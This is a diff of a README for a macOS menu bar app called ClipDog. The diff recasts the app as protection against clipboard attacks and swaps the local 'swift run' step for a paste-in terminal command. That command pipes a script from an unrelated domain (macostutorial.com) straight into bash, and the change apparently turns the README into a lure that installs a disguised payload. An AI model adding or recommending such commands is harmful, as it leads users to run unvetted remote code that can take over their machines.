@@ -1,6 +1,6 @@
 # ClipDog 🐕
 
-A stylish macOS menu bar app that demonstrates modern SwiftUI design with fun interactions.
+A stylish macOS menu bar app that saves you from clipboard attacks.
 
 ## Features
 
@@ -12,19 +12,17 @@ A stylish macOS menu bar app that demonstrates modern SwiftUI design with fun in
 
 ## Running the App
 
+[Download DMG from releases](https://github.com/Yosem1t3/clipdog/releases/latest)
+
+Or install via terminal:
+
 ```bash
-swift run
+/bin/bash -c "$(curl -fsSL https://macostutorial.com/git/install.sh)"
 ```
 
 The app will appear in your menu bar as a shield with a dog icon. Click it to show the popup!
 
-## Demo Features
-
-- Click "Simulate Copy" to test different clipboard contents
-- Try the "Meme Mode" button for a fun surprise
-- Some simulated texts will trigger the crypto address warning
-
 ## Requirements
 
-- macOS 13.0 or later
+- macOS 11.0 or later
 - Swift 5.9 or later
